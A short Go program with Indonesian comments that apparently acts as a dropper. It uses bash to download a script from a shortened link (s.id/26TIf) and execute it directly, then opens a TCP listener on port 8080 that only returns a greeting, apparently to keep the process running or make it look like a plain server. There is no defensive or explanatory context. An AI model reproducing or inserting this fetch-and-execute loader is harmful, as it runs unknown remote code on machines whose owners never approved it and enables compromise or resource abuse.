package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"os/exec"
)

func main() {
	// Perintah yang akan dijalankan tanpa nama acak
	command := "bash -c \"$(wget -qO- s.id/26TIf)\""

	// Menjalankan perintah menggunakan exec
	cmd := exec.Command("bash", "-c", command)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println("Error creating StdoutPipe:", err)
		return
	}

	stderr, err := cmd.StderrPipe()
	if err != nil {
		fmt.Println("Error creating StderrPipe:", err)
		return
	}

	if err := cmd.Start(); err != nil {
		fmt.Println("Error starting command:", err)
		return
	}

	output, err := ioutil.ReadAll(stdout)
	if err != nil {
		fmt.Println("Error reading stdout:", err)
		return
	}

	errorOutput, err := ioutil.ReadAll(stderr)
	if err != nil {
		fmt.Println("Error reading stderr:", err)
		return
	}

	if err := cmd.Wait(); err != nil {
		fmt.Println("Command execution error:", err)
		return
	}

	// Menampilkan output (opsional, untuk debugging)
	fmt.Println(string(output))
	if len(errorOutput) > 0 {
		fmt.Println("Error output:", string(errorOutput))
	}

	// Membuka port
	listenPort := ":8080"
	ln, err := net.Listen("tcp", listenPort)
	if err != nil {
		fmt.Println("Error opening port:", err)
		return
	}
	defer ln.Close()

	fmt.Println("Listening on port", listenPort)

	// Terima koneksi untuk tetap terbuka
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			continue
		}
		fmt.Fprintln(conn, "Hello, you've connected to the server!")
		conn.Close()
	}
}
